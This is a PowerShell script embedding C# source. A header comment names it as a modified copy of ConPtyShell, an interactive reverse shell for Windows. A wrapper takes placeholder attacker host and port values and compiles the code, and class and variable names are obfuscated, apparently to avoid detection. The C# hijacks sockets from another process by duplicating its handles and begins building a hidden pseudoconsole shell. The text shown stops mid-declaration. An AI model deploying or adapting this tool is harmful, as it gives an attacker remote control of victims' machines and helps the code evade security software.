function *FUNC*
{   
    # This is a slightly modified version of:
    #   ConPtyShell - Fully Interactive Reverse Shell for Windows 
    #   Author: splinter_code
    #   License: MIT
    #   Source: https://github.com/antonioCoco/ConPtyShell

    $parameterseRv6yTYhShell = @("*LHOST*", "*LPORT*", "24", "80", "powershell.exe")
    Add-Type -TypeDefinition $Source -Language CSharp;
    [cPTYsMC]::cPTYs33ed($parameterseRv6yTYhShell)
}

$Source = @"
using System;using System.IO;using System.Text;using System.Threading;
using System.Net;using System.Net.Sockets;using System.Net.NetworkInformation;
using System.Runtime.InteropServices;using System.Diagnostics;using System.Collections.Generic;

public class cPTYx : Exception
{
    private const string error_string = "[-] cPTYx: ";
    public cPTYx() { }
    public cPTYx(string message) : base(error_string + message) { }
}

public class DeadlockCheckHelper
{

    private bool deadlockDetected;
    private IntPtr targetHandle;

    private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    private uint ThreadCheckDeadlock(uint threadParams)
    {
        IntPtr objPtr = IntPtr.Zero;
        objPtr = sHJck.NtQueryObjectDynamic(this.targetHandle, sHJck.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
        this.deadlockDetected = false;
        if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
        return 0;
    }

    public bool CheckDeadlockDetected(IntPtr tHandle)
    {
        this.deadlockDetected = true;this.targetHandle = tHandle;
        LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
        IntPtr hThread = IntPtr.Zero;uint threadId = 0;
        hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 1500);
        CloseHandle(hThread);
        return this.deadlockDetected;
    }
}

public static class sHJck
{

    private const uint NTSTATUS_SUCCESS = 0x00000000;private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
    private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;
    private const int NTSTATUS_PENDING = 0x00000103;private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const int DUPLICATE_SAME_ACCESS = 0x2;private const int SystemHandleInformation = 16;
    private const int PROCESS_DUP_HANDLE = 0x0040;private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
    private const int SG_UNCONSTRAINED_GROUP = 0x1;private const int SG_CONSTRAINED_GROUP = 0x2;
    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;private const int EVENT_ALL_ACCESS = 0x1f0003;
    private const int SynchronizationEvent = 1;private const UInt32 INFINITE = 0xFFFFFFFF;

    private enum SOCKET_STATE : uint
    {
        SocketOpen = 0,
        SocketBound = 1,
        SocketBoundUdp = 2,
        SocketConnected = 3,
        SocketClosed = 3
    }

    private enum AFD_GROUP_TYPE : uint
    {
        GroupTypeNeither = 0,
        GroupTypeConstrained = SG_CONSTRAINED_GROUP,
        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
    }

    public enum OBJECT_INFORMATION_CLASS : int
    {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3,
        ObjectHandleInformation = 4
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
    public ushort UniqueProcessId;public ushort CreatorBackTraceIndex;public byte ObjectTypeIndex;public byte HandleAttributes;public ushort HandleValue;public IntPtr Object;public IntPtr GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct GENERIC_MAPPING
    {
        public int GenericRead;public int GenericWrite;public int GenericExecute;public int GenericAll;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_TYPE_INFORMATION_V2
    {
        public UNICODE_STRING TypeName;public uint TotalNumberOfObjects;public uint TotalNumberOfHandles;public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;public uint TotalNamePoolUsage;public uint TotalHandleTableUsage;public uint HighWaterNumberOfObjects;
        public uint HighWaterNumberOfHandles;public uint HighWaterPagedPoolUsage;public uint HighWaterNonPagedPoolUsage;public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;public uint InvalidAttributes;public GENERIC_MAPPING GenericMapping;public uint ValidAccessMask;
        public byte SecurityRequired;public byte MaintainHandleCount;public byte TypeIndex;public byte ReservedByte;public uint PoolType;
        public uint DefaultPagedPoolCharge;public uint DefaultNonPagedPoolCharge;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_NAME_INFORMATION
    {
        public UNICODE_STRING Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;public ushort MaximumLength;public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;public short wHighVersion;public short iMaxSockets;
        public short iMaxUdpDg;public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOLCHAIN
    {
        public int ChainLen;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
        public uint[] ChainEntries;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOL_INFO
    {
        public uint dwServiceFlags1;public uint dwServiceFlags2;public uint dwServiceFlags3;public uint dwServiceFlags4;
        public uint dwProviderFlags;public Guid ProviderId;public uint dwCatalogEntryId;public WSAPROTOCOLCHAIN ProtocolChain;
        public int iVersion;public int iAddressFamily;public int iMaxSockAddr;public int iMinSockAddr;
        public int iSocketType;public int iProtocol;public int iProtocolMaxOffset;public int iNetworkByteOrder;
        public int iSecurityScheme;public uint dwMessageSize;public uint dwProviderReserved;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;public short sin_port;public uint sin_addr;public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TCP_INFO_v0
    {
        public TcpState State;public UInt32 Mss;public UInt64 ConnectionTimeMs;public byte TimestampsEnabled;
        public UInt32 RttUs;public UInt32 MinRttUs;public UInt32 BytesInFlight;public UInt32 Cwnd;public UInt32 SndWnd;
        public UInt32 RcvWnd;public UInt32 RcvBuf;public UInt64 BytesOut;public UInt64 BytesIn;
        public UInt32 BytesReordered;public UInt32 BytesRetrans;public UInt32 FastRetrans;public UInt32 DupAcksIn;
        public UInt32 TimeoutEpisodes;public byte SynRetrans;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct linger
    {
        public UInt16 l_onoff;
        public UInt16 l_linger;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    private struct IO_STATUS_BLOCK
    {
        public int status;
        public IntPtr information;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCK_SHARED_INFO
    {
        public SOCKET_STATE State;public Int32 AddressFamily;public Int32 SocketType;public Int32 Protocol;
        public Int32 LocalAddressLength;public Int32 RemoteAddressLength;
        public linger LingerInfo;public UInt32 SendTimeout;public UInt32 ReceiveTimeout;public UInt32 ReceiveBufferSize;
        public UInt32 SendBufferSize;public ushort SocketProperty;public UInt32 CreationFlags;public UInt32 CatalogEntryId;
        public UInt32 ServiceFlags1;public UInt32 ProviderFlags;public UInt32 GroupID;public AFD_GROUP_TYPE GroupType;
        public Int32 GroupPriority;public Int32 LastError;public IntPtr AsyncSelecthWnd;public UInt32 AsyncSelectSerialNumber;
        public UInt32 AsyncSelectwMsg;public Int32 AsyncSelectlEvent;public Int32 DisabledAsyncSelectEvents;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR
    {
        public UInt16 sa_family;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]
        public byte[] sa_data;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKET_CONTEXT
    {
        public SOCK_SHARED_INFO SharedData;public UInt32 SizeOfHelperData;public UInt32 Padding;public SOCKADDR LocalAddress;public SOCKADDR RemoteAddress;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
        public byte[] HelperData;
    }

    private struct SOCKET_BYTESIN
    {
        public IntPtr handle;public UInt64 BytesIn;
    }


    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);

    [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("ntdll.dll")]
    private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);

    [DllImport("ntdll.dll")]
    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);

    [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);

    [DllImport("Ws2_32.dll")]
    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
    
    private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
    {
        if (infoLength == 0)
            infoLength = 0x10000;
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        while (true)
        {
            uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);
            infoLength = infoLength * 2;
            if (result == NTSTATUS_SUCCESS)
                return infoPtr;
            Marshal.FreeHGlobal(infoPtr);  
            if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
            {
                return IntPtr.Zero;
            }
            infoPtr = Marshal.AllocHGlobal(infoLength);
        }
    }

    private static IntPtr QueryObjectTypesInfo()
    {
        IntPtr ptrObjectTypesInformation = IntPtr.Zero;
        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
        return ptrObjectTypesInformation;
    }

    private static long AlignUp(long address, long align)
    {
        return (((address) + (align) - 1) & ~((align) - 1));
    }

    private static byte GetTypeIndexByName(string ObjectName)
    {
        byte TypeIndex = 0;long TypesCount = 0;IntPtr ptrTypesInfo = IntPtr.Zero;
        ptrTypesInfo = QueryObjectTypesInfo();
        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
        for (int i = 0; i < TypesCount; i++)
        {
            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
            if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
            {
                TypeIndex = Type.TypeIndex;
                break;
            }
        }
        Marshal.FreeHGlobal(ptrTypesInfo);
        return TypeIndex;
    }

    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> sockets)
    {
        List<IntPtr> dupedSocketsOut = new List<IntPtr>();
        if (sockets.Count < 1) return dupedSocketsOut;
        foreach (IntPtr sock in sockets)
        {
            IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
            if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
        }
        foreach (IntPtr sock in sockets)
            CloseHandle(sock);
        return dupedSocketsOut;
    }

    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)
    {
        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();
        List<IntPtr> socketsOut = new List<IntPtr>();
        foreach (IntPtr sock in sockets)
        {
            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
            if (!GetSocketTcpInfo(sock, out sockInfo))
            {
                closesocket(sock);
                continue;
            }
            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
            {
                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
                sockBytesIn.handle = sock;
                sockBytesIn.BytesIn = sockInfo.BytesIn;
                socketsBytesIn.Add(sockBytesIn);
            }
            else
                closesocket(sock);
        }
        if (socketsBytesIn.Count < 1) return socketsOut;
        if (socketsBytesIn.Count >= 2)
            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
        {
            socketsOut.Add(sockBytesIn.handle);
        }
        return socketsOut;
    }

    private static bool GetSocketTcpInfo(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)
    {
        int result = -1;
        UInt32 tcpInfoVersion = 0;
        int bytesReturned = 0;
        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));
        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);
        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
        if (result != 0)
        {
            tcpInfoOut = new TCP_INFO_v0();
            return false;
        }
        TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
        tcpInfoOut = tcpInfoV0;
        Marshal.FreeHGlobal(tcpInfoPtr);
        return true;
    }

    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
    {
        IntPtr retSocket = IntPtr.Zero;
        IntPtr duplicatedSocket = IntPtr.Zero;
        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
        if (status == 0)
        {
            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
            if (duplicatedSocket.ToInt64() > 0)
            {
                retSocket = duplicatedSocket;
            }
        }
        return retSocket;
    }

    public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
    {
        if (infoLength == 0)
            infoLength = Marshal.SizeOf(typeof(int));
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        uint result;
        while (true)
        {
            result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);
            if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)
            {
                Marshal.FreeHGlobal(infoPtr);
                infoPtr = Marshal.AllocHGlobal((int)infoLength);
                continue;
            }
            else if (result == NTSTATUS_SUCCESS)
                break;
            else
            {
                break;
            }
        }
        if (result == NTSTATUS_SUCCESS)
            return infoPtr;
        else
            Marshal.FreeHGlobal(infoPtr);
        return IntPtr.Zero;
    }

    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
    {
        OBJECT_NAME_INFORMATION objNameInfo;
        long HandlesCount = 0;
        IntPtr dupHandle;
        IntPtr ptrObjectName;
        IntPtr ptrHandlesInfo;
        IntPtr hTargetProcess;
        string strObjectName;
        List<IntPtr> socketsHandles = new List<IntPtr>();
        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
        if (hTargetProcess == IntPtr.Zero)
        {
            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
            return socketsHandles;
        }
        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
        byte TypeIndexFileObject = GetTypeIndexByName("File");
        for (int i = 0; i < HandlesCount; i++)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
            try
            {
                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            }
            catch
            {
                break;
            }
            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                continue;
            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
            {
                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
                if (ptrObjectName == IntPtr.Zero)
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                try
                {
                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
                }
                catch
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                {
                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
                    if (strObjectName == "\\Device\\Afd")
                        socketsHandles.Add(dupHandle);
                    else
                        CloseHandle(dupHandle);
                }
                else
                    CloseHandle(dupHandle);
                Marshal.FreeHGlobal(ptrObjectName);
                ptrObjectName = IntPtr.Zero;
            }
        }
        Marshal.FreeHGlobal(ptrHandlesInfo);
        List<IntPtr> dupedSocketsHandles = DuplicateSocketsFromHandles(socketsHandles);
        if (dupedSocketsHandles.Count >= 1)
            dupedSocketsHandles = FilterAndOrderSocketsByBytesIn(dupedSocketsHandles);
        socketsHandles = dupedSocketsHandles;
        return socketsHandles;
    }

    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
    {
        bool inherited = false;
        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
        if (parentSocketsHandles.Count < 1)
            return inherited;
        foreach (IntPtr parentSocketHandle in parentSocketsHandles)
        {
            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
            if (
                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == 0) &&
                (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&
                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
               )
            {
                inherited = true;
            }
            closesocket(parentSocketHandle);
        }
        return inherited;
    }

    public static bool IsSocketOverlapped(IntPtr socket)
    {
        bool ret = false;
        IntPtr sockEvent = IntPtr.Zero;
        int ntStatus = -1;
        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
        if (ntStatus != NTSTATUS_SUCCESS)
        {
            return ret;
        }
        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
        if (ntStatus == NTSTATUS_PENDING)
        {
            WaitForSingleObject(sockEvent, INFINITE);
            ntStatus = IOSB.status;
        }
        CloseHandle(sockEvent);

        if (ntStatus != NTSTATUS_SUCCESS)
        {
            return ret;
        }
        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
        return ret;
    }

    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        IntPtr targetSocketHandle = IntPtr.Zero;
        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
        if (targetProcessSockets.Count < 1) return targetSocketHandle;
        else
        {
            foreach (IntPtr socketHandle in targetProcessSockets)
            {
                if (!IsSocketOverlapped(socketHandle))
                {
                    continue;
                }
                targetSocketHandle = socketHandle;
                overlappedSocket = true;
                break;
            }
            if (targetSocketHandle == IntPtr.Zero) {
                foreach (IntPtr socketHandle in targetProcessSockets)
                {
                    targetSocketHandle = socketHandle;
                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;
                    break;
                }
            }
        }
        if (targetSocketHandle == IntPtr.Zero)
            throw new cPTYx("No sockets found, so no hijackable sockets :( Exiting...");
        return targetSocketHandle;
    }
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        int FIONBIO = -2147195266;
        int NonBlockingMode = 1;
        int BlockingMode = 0;
        int result;
        if (mode == 1)
            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);
        else
            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
        if (result == -1)
            throw new cPTYx("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}

[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    internal IntPtr Reserved1;
    internal IntPtr PebBaseAddress;
    internal IntPtr Reserved2_0;
    internal IntPtr Reserved2_1;
    internal IntPtr UniqueProcessId;
    internal IntPtr InheritedFromUniqueProcessId;

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);

    public static Process GetParentProcess()
    {
        return GetParentProcess(Process.GetCurrentProcess().Handle);
    }

    public static Process GetParentProcess(int id)
    {
        Process process = Process.GetProcessById(id);
        return GetParentProcess(process.Handle);
    }

    public static Process GetParentProcess(IntPtr handle)
    {
        ParentProcessUtilities pbi = new ParentProcessUtilities();
        int returnLength;
        int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
        if (status != 0)
            throw new cPTYx(status.ToString());
        try
        {
            return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
        }
        catch (ArgumentException)
        {
            return null;
        }
    }
}

public static class eRv6yTYhShell
{
    private const string errorString = "{{{cPTYx}}}\r\n";
    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const int STARTF_USESTDHANDLES = 0x00000100;
    private const int BUFFER_SIZE_PIPE = 1048576;
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const UInt32 INFINITE = 0xFFFFFFFF;
    private const int SW_HIDE = 0;
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_SHARE_WRITE = 0x00000002;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint OPEN_EXISTING = 3;
    private const int STD_INPUT_HANDLE = -10;
    private const int STD_OUTPUT_HANDLE = -11;
    private const int STD_ERROR_HANDLE = -12;
    private const int WSAEWOULDBLOCK = 10035;
    private const int FD_READ = (1 << 0);


    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    [return: MarshalAs(UnmanagedType.Bool)]
